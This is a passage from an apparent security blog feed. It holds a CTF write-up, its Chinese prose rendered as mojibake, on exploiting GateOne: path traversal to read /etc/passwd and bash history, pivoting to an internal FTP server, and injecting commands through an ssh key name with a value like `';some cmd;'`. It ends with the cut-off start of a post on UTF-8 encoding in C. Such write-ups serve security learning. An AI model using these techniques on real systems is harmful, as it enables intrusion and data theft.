class="number">404</span>)</span><br><span class="line">    self.write(self.get_error_html(<span class="number">404</span>))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(abspath):</span><br><span class="line">    <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">403</span>, <span class="string">"%s is not a file"</span>, path)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤, å°±æŠŠ <code>path</code> æ‹¼è¿›äº† <code>filepath</code>, å­˜åœ¨ç›®å½•ç©¿è¶Š, å¯ä»¥ä»»æ„æ–‡ä»¶è¯».  </p><p><img src="https://i.loli.net/2019/08/26/JbZuMYALTe7ivFn.png" alt=""></p><p>è¯» <code>/etc/passwd</code> æ‰¾åˆ°ç”¨æˆ· ctf, ç»§ç»­ fuzz ä¸€äº›å¸¸ç”¨æ–‡ä»¶, å¯ä»¥è¯»åˆ° <code>/home/ctf/.bash_history</code>,  </p><p><img src="https://i.loli.net/2019/08/26/5Ay41drtXPIopGT.png" alt=""></p><p>ç»™äº† <code>ftp niconiconi</code> è¿™åº”è¯¥å°±æ˜¯é¢˜ç›®æè¿°é‡Œçš„å†…ç½‘æœºå™¨äº†, ä½†æ˜¯æˆ‘ä»¬æ­¤æ—¶å¹¶æ²¡æœ‰è¿æ¥ ftp æœåŠ¡çš„èƒ½åŠ›.<br>ç»§ç»­å®¡è®¡æºç , å¯ä»¥å‘ç° <code>gateone/applications/terminal/plugins/ssh/scripts/ssh_connect.py</code> é‡Œçš„  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> protocol == <span class="string">'telnet'</span>:</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        print(_(<span class="string">'Connecting to telnet://%s@%s:%s'</span> % (user, host, port)))</span><br><span class="line">        <span class="comment"># Set title</span></span><br><span class="line">        print(<span class="string">"\x1b]0;telnet://%s@%s\007"</span> % (user, host))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(_(<span class="string">'Connecting to telnet://%s:%s'</span> % (host, port)))</span><br><span class="line">        <span class="comment"># Set title</span></span><br><span class="line">        print(<span class="string">"\x1b]0;telnet://%s\007"</span> % host)</span><br><span class="line">    telnet_connect(user, host, port)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶å®æ”¯æŒ <code>telnet</code>, åªæ˜¯æ²¡æœ‰å†™å‡ºæ¥â€¦, è€Œ <code>telnet</code> åŸºæœ¬ä¸Šè·Ÿ <code>nc</code> å·®ä¸å¤š, æˆ‘ä»¬å¯ä»¥æ‰‹æ•² ftp å‘½ä»¤æ¥è·å– flag<br>éšä¾¿è¯•ä¸€ä¸‹, å‘ç° <code>ctf</code>, <code>ctf</code> å°±æ˜¯è´¦å·å¯†ç   </p><p><img src="https://i.loli.net/2019/08/26/mhANxTvoCfXYMaQ.png" alt="">  </p><p><img src="https://i.loli.net/2019/08/26/OqzgWR47sx3NED9.png" alt=""></p><p>è¿™é‡Œæ³¨æ„ ftp ä¼ è¾“æ–‡ä»¶è¿˜éœ€è¦å¼€å¦ä¸€ä¸ªé“¾æ¥, å¯ä»¥é€‰æ‹©å®¢æˆ·ç«¯é“¾æ¥æœåŠ¡å™¨ (PASV) æˆ–è€… æœåŠ¡å™¨é“¾æ¥å®¢æˆ·ç«¯ (PORT), è¿™é‡Œå½“ç„¶æ˜¯å®¢æˆ·ç«¯é“¾æ¥æœåŠ¡å™¨.<br>æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª (ip1, ip2, ip3, ip4, p1, p2), p1 * 256 + p2 å°±æ˜¯æˆ‘ä»¬éœ€è¦é“¾æ¥çš„ç«¯å£, ç„¶åç”¨ RERT å‘½ä»¤å°±èƒ½è¯»å–æ–‡ä»¶äº†.  </p><p>è¿™é‡Œè¿˜æœ‰ä¸ªå°æ’æ›², è¿™ä¸ªåº”ç”¨è¿˜è‡ªå¸¦å›æ”¾åŠŸèƒ½, äºæ˜¯å¯ä»¥å·çœ‹åˆ«äººçš„ flagâ€¦</p><p><img src="https://i.loli.net/2019/08/26/7tXZLBCm8nVlvuU.png" alt="">  </p><p>æ‰€ä»¥æˆ‘çŒœåé¢æ”¹é¢˜ç›®, æŠŠ flag è®¾æˆä¸€åŠåœ¨æœ¬æœº <code>/flag</code> ä¸Š, ä¸€åŠåœ¨å†…ç½‘ ftp çš„åŸå› å°±æ˜¯è¿™ä¸ª 2333<br>è€Œä¸”åé¢åˆæ”¹äº†ä¸€æ¬¡, è¿˜åŠ äº†ä¸€é¢˜ <code>Easy Realworld Challenge 2</code>, å¯èƒ½å°±æ˜¯æŸä½å¤§ä½¬å‘ç°çš„ RCE å¯¼è‡´äº†éé¢„æœŸ  </p><h2 id="Ogeek-Easy-Realworld-Challenge-2"><a href="#Ogeek-Easy-Realworld-Challenge-2" class="headerlink" title="Ogeek Easy Realworld Challenge 2"></a>Ogeek Easy Realworld Challenge 2</h2><p>åˆ°æˆ‘ä»¬ç›®å‰çš„èƒ½åŠ›æ˜¯ä»»æ„æ–‡ä»¶è¯»å– + SSRF, æ ¹æ®é¢˜ç›®æè¿°, åº”è¯¥æ˜¯å¾—æ‹¿åˆ° shell æ‰èƒ½è¯» flag äº†. äºæ˜¯åªèƒ½ç»§ç»­å®¡è®¡æºç  233  </p><p>å¯ä»¥çœ‹åˆ°åœ¨ ssh é“¾æ¥æ—¶, æ˜¯ç›´æ¥æ‹¼çš„å‘½ä»¤, ç„¶åæ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢è°ƒç”¨ execvpe æ‰§è¡Œ /bin/sh æ¥è·‘è¿™ä¸ªå‘½ä»¤, ä½†æ˜¯è¿‡æ»¤è¿˜æ˜¯å¾ˆä¸¥æ ¼çš„, æ²¡åŠæ³•æ³¨å…¥å‘½ä»¤, </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bad_chars</span><span class="params">(chars)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    bad_chars = re.compile(<span class="string">'.*[\$\n\!\;&amp;` |&lt;&gt;].*'</span>)</span><br><span class="line">    <span class="keyword">if</span> bad_chars.match(chars):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> validated:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        url = raw_input(_(</span><br><span class="line">            <span class="string">"[Press Shift-F1 for help]\n\nHost/IP or ssh:// URL%s: "</span> %</span><br><span class="line">            default_host_str))</span><br><span class="line">    <span class="keyword">if</span> bad_chars(url):</span><br><span class="line">        raw_input(invalid_hostname_err)</span><br><span class="line">        url = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">if</span> options.default_host:</span><br><span class="line">            host = options.default_host</span><br><span class="line">            protocol = <span class="string">'ssh'</span></span><br><span class="line">            validated = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            raw_input(invalid_hostname_err)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªä¸ä»…ä»…æœ‰ä¸ª ssh é“¾æ¥çš„åŠŸèƒ½, è¿˜èƒ½ç”Ÿæˆ ssh ç§˜é’¥,  </p><p><img src="https://i.loli.net/2019/08/26/s7pjlYCm6RLKhPV.png" alt="">  </p><p>æˆ‘ä»¬ä»”ç»†æ¥çœ‹è¿™ä¸ª <code>gateone/applications/terminal/plugins/ssh/ssh.py</code> ç¬¬ 615 è¡Œ <code>generate_new_keypair</code>,  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> which(<span class="string">'ssh-keygen'</span>): <span class="comment"># Prefer OpenSSH</span></span><br><span class="line">    openssh_generate_new_keypair(</span><br><span class="line">        self,</span><br><span class="line">        name, <span class="comment"># Name to use when generating the keypair</span></span><br><span class="line">        users_ssh_dir, <span class="comment"># Path to save it</span></span><br><span class="line">        keytype=keytype,</span><br><span class="line">        passphrase=passphrase,</span><br><span class="line">        bits=bits,</span><br><span class="line">        comment=comment</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">elif</span> which(<span class="string">'dropbearkey'</span>):</span><br><span class="line">    dropbear_generate_new_keypair(self,</span><br><span class="line">        name, <span class="comment"># Name to use when generating the keypair</span></span><br><span class="line">        users_ssh_dir, <span class="comment"># Path to save it</span></span><br><span class="line">        keytype=keytype,</span><br><span class="line">        passphrase=passphrase,</span><br><span class="line">        bits=bits,</span><br><span class="line">        comment=comment)</span><br></pre></td></tr></table></figure><p>ä¼šåˆ¤æ–­ç”¨çš„æ˜¯ openssh æˆ–è€… dropbear æ¥è°ƒç”¨å¯¹åº”çš„ç§˜é’¥ç”Ÿæˆå‘½ä»¤, è¿™é‡Œè‚¯å®šæ˜¯ openssh, æ¥åˆ° 699 è¡Œ <code>openssh_generate_new_keypair</code>, å¯ä»¥çœ‹åˆ°  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openssh_generate_new_keypair</span><span class="params">(self, name, path,</span></span></span><br><span class="line"><span class="function"><span class="params">        keytype=None, passphrase=<span class="string">""</span>, bits=None, comment=<span class="string">""</span>)</span>:</span></span><br><span class="line">    self.ssh_log.debug(<span class="string">'openssh_generate_new_keypair()'</span>)</span><br><span class="line">    openssh_version = shell_command(<span class="string">'ssh -V'</span>)[<span class="number">1</span>]</span><br><span class="line">    ssh_major_version = int(</span><br><span class="line">        openssh_version.split()[<span class="number">0</span>].split(<span class="string">'_'</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>])</span><br><span class="line">    key_path = os.path.join(path, name)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    ssh_keygen_path = which(<span class="string">'ssh-keygen'</span>)</span><br><span class="line">    command = (</span><br><span class="line">        <span class="string">"%s "</span>       <span class="comment"># Path to ssh-keygen</span></span><br><span class="line">        <span class="string">"-b %s "</span>    <span class="comment"># bits</span></span><br><span class="line">        <span class="string">"-t %s "</span>    <span class="comment"># keytype</span></span><br><span class="line">        <span class="string">"-C '%s' "</span>  <span class="comment"># comment</span></span><br><span class="line">        <span class="string">"-f '%s'"</span>   <span class="comment"># Key path</span></span><br><span class="line">        % (ssh_keygen_path, bits, keytype, comment, key_path)</span><br><span class="line">    )</span><br><span class="line">    self.ssh_log.debug(<span class="string">"Keygen command: %s"</span> % command)</span><br><span class="line">    m = self.new_multiplex(command, <span class="string">"gen_ssh_keypair"</span>)</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯æ‹¼çš„å‘½ä»¤, ä¸åŒçš„æ˜¯æ²¡æœ‰äº†è¿‡æ»¤. å› ä¸º name å¯æ§, æœ€åå¯¼è‡´ keypath å¯æ§, æˆ‘ä»¬åªéœ€è¦æ³¨å…¥ä¸€ä¸ª <code>&#39;;some cmd;&#39;</code> å°±èƒ½æ³¨å…¥æˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤äº†.  </p><p>è¿™é‡Œå¯ä»¥ç”¨ Burpsuite æ¥æ”¹ websocket çš„å†…å®¹  </p><p><img src="https://i.loli.net/2019/08/26/wPzJEIvnuGDHyqj.png" alt=""></p><p>ç„¶åç»“åˆä¹‹å‰çš„ä»»æ„æ–‡ä»¶è¯»å–æ¥è¯»å‘½ä»¤æ‰§è¡Œçš„ç»“æœ    </p><p><img src="https://i.loli.net/2019/08/26/PctX1T9qjbD7KM2.png" alt=""></p><p>ç„¶åå°±å¯ä»¥å‘ç° flag å•¦, å¯ä»¥ç›´æ¥è¯». å¦å¤–, é™¤äº†è¿™ä¸ªåœ°æ–¹è¿˜æœ‰å…¶ä»–åœ°æ–¹ä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜, è¿™é‡Œä¸å†ä¸€ä¸€ä¸¾å‡º. </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™æ¬¡ Ogeek çš„ web éƒ½æŒºæœ‰æ„æ€. è¿™ä¸¤é¢˜åå‘ä»£ç å®¡è®¡, è€Œä¸”å¦‚é¢˜ç›®å &lt;code&gt;Easy Realworld&lt;/code&gt;, éƒ½æ˜¯å®¡è®¡åº”ç”¨æœ¬èº«çš„æ¼æ´, å·®ä¸å¤šå°±æ˜¯æ‰¾ 0day äº†, åœ¨è¿™é‡Œåˆ†äº«ç»™å¤§å®¶.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="audit" scheme="https://rmb122.com/tags/audit/"/>
    
  </entry>
  
  <entry>
    <title>æ·±å…¥ç†è§£å­—ç¬¦ç¼–ç </title>
    <link href="https://rmb122.com/2019/08/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
    <id>https://rmb122.com/2019/08/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</id>
    <published>2019-08-06T08:13:47.000Z</published>
    <updated>2019-08-06T11:41:27.152Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥å‰å¯¹ UTF-8, UTF-16, unicode, GBK, ASCII ä¹‹ç±»çš„éƒ½æ˜¯ä¸€çŸ¥åŠè§£, å…¶å®æ·±å…¥ä¹‹åäº†è§£è¿™äº›å¹¶ä¸å›°éš¾.  </p><a id="more"></a><h2 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h2><p>å…¶å®è¿™æ˜¯æœ€ç®€å•çš„, unicode å°±æ˜¯ä¸€å¥—æ ‡å‡†, æŠŠä¸–ç•Œä¸Šæ¯ä¸ªå­˜åœ¨çš„å­—ç¬¦ (ç”šè‡³åŒ…æ‹¬ emoji) éƒ½ç¼–ä¸€ä¸ªå·, å¯ä»¥åœ¨ <a href="https://unicode-table.com/cn/" target="_blank" rel="noopener">https://unicode-table.com/cn/</a> çœ‹åˆ°å…¨éƒ¨çš„ç¼–ç ,<br>æŠŠè¿™ä¸ªç¼–çš„å·, ä¸€èˆ¬å«åš code point, ä¹Ÿå°±æ˜¯ç ç‚¹. åŒæ—¶ä¹Ÿè®¾å®šäº†å‡ ä¸ªç¼–ç çš„æ ‡å‡†, ä¹Ÿå°±æ˜¯ UTF-8, UTF-16 ç­‰ç­‰, æ¯•ç«Ÿç›´æ¥æŠŠç ç‚¹è½¬äºŒè¿›åˆ¶å¤ªæµªè´¹ç©ºé—´äº†.  </p><p>è€Œè¿™äº›ç¼–ç , å°±æ˜¯æŠŠè¿™äº›ç ç‚¹ä¿å­˜ä¸ºè®¡ç®—æœºå¯ä»¥è¯†åˆ«çš„äºŒè¿›åˆ¶å½¢å¼.  </p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8 å°±æ˜¯è¿™äº›ç¼–ç çš„ä¸€ç§, è¯¦ç»†å¯ä»¥å‚è€ƒ<a href="https://zh.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a>, ç®€å•æ¥è¯´, å°±æ˜¯æŠŠç ç‚¹è½¬ä¸ºäºŒè¿›åˆ¶å,<br>ç„¶åä¸ºäº†èŠ‚çœç©ºé—´, æŠŠä¸åŒå¤§å°çš„ç ç‚¹è½¬ä¸ºä¸åŒé•¿åº¦çš„å­—èŠ‚åºåˆ—, è¿™å°±æ˜¯ä»–å¤©æ‰çš„åœ°æ–¹, ç”¨å˜é•¿ç¼–ç æ¥èŠ‚çœé•¿åº¦.  </p><p>è¿™é‡Œä»¥ <code>å•Š</code> ä¸ºä¾‹, å®ƒçš„ç ç‚¹æ˜¯ <code>0x554a</code>, åœ¨ <code>U+0800~U+FFFF</code> çš„èŒƒå›´å†…, äºŒè¿›åˆ¶æ˜¯ <code>0b101010101001010</code>,<br>é‚£ä¹ˆæ ¹æ®å®šä¹‰, ä»–çš„ä¿å­˜æ–¹å¼æ˜¯ <code>1110xxxx 10xxxxxx 10xxxxxx</code>, æˆ‘ä»¬å°†è¿™ä¸ªç ç‚¹çš„äºŒè¿›åˆ¶ä»¥å¤§ç«¯çš„æ–¹å¼å¡«å…¥å…¶ä¸­,<br>å¾—åˆ° <code>1110|0101 10|010101 10|001010</code>, ä¹Ÿå°±æ˜¯ <code>b&#39;\xe5\x95\x8a&#39;</code>, å¯ä»¥å°è¯•åœ¨ python è§£ç , å¾—åˆ°çš„å°±æ˜¯ <code>å•Š</code>.  </p><p>è€Œåœ¨ <code>0x00 ~ 0xFF</code> èŒƒå›´å†…, UTF-8 å…¶å®å°±è¢«é€€åŒ–ä¸º ASCII äº†, ä¸€æ˜¯ä¸ºäº†å…¼å®¹æ€§, äºŒæ˜¯ç¡®å® ASCII æ‰€æ¶µç›–çš„ç¬¦å·, ç¡®å®ç”¨çš„éå¸¸å¤š.<br>è¿™é‡Œå¯ä»¥æ‰‹åŠ¨å†™ä¸€äº› UTF-8 çš„å‡½æ•°æ¥åŠ æ·±å­¦ä¹ , å› ä¸ºæ˜¯å˜é•¿çš„, æ‰€ä»¥æ¥ç®—é•¿åº¦, ä»¥åŠæˆªå–ç›¸å¯¹æ¯”è¾ƒéº»çƒ¦.<br>è¿™é‡Œç”¨æˆ‘ç”¨ c å†™, æ„Ÿè§‰éå¸¸çš„çˆ½, å°±åƒåœ¨é«˜é€Ÿå…¬è·¯ä¸Šé£™è½¦, æ§åˆ¶ä¸å¥½å°±ä¼šç¿»è½¦ (Segment fault) 233, ä½†æ˜¯ç¡®å®æ˜¯æœ€æ¥è¿‘è¿™äº›å­—ç¬¦ç¼–ç æœ¬æ¥çš„æ ·å­.<br>æ²¡æœ‰äº† python ä¸Šå„ç§çš„åŒ…è£….  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">read_file</span><span class="params">(<span class="keyword">char</span> *filename)</span> </span>&#123;</span><br><span class="line">    FILE *fd = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">    fseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> sz = ftell(fd);</span><br><span class="line">    fseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *content = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * sz);</span><br><span class="line">    fread(content, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), sz, fd);</span><br><span class="line"></span><br><span class="line">    fclose(fd);</span><br><span class="line">    <span class="keyword">return</span> content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8_strlen</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            length += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">codepoint_to_utf8</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> codepoint, <span class="keyword">int</span> *sz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">if</span> (codepoint &lt; <span class="number">0x80</span>) &#123;</span><br><span class="line">        *sz = <span class="number">1</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        *s = codepoint;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x800</span>) &#123;</span><br><span class="line">        *sz = <span class="number">2</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">2</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00011111</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        *sz = <span class="number">3</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">3</span>);</span><br><span class="line">        *(s + <span class="number">2</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11100000</span> | ((codepoint &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b00001111</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *sz = <span class="number">4</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">4</span>);</span><br><span class="line">        *(s + <span class="number">3</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">2</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11110000</span> | ((codepoint &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0b00000111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_tail_length</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((c &amp; <span class="number">0b11111000</span>) == <span class="number">0b11110000</span>) &#123;</span><br><span class="line">        length = <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c &amp; <span class="number">0b11110000</span>) == <span class="number">0b11100000</span>) &#123;</span><br><span class="line">        length = <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c &amp; <span class="number">0b11100000</span>) == <span class="number">0b11000000</span>) &#123;</span><br><span class="line">        length = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">utf8_substr</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> curr_pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> byte_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span 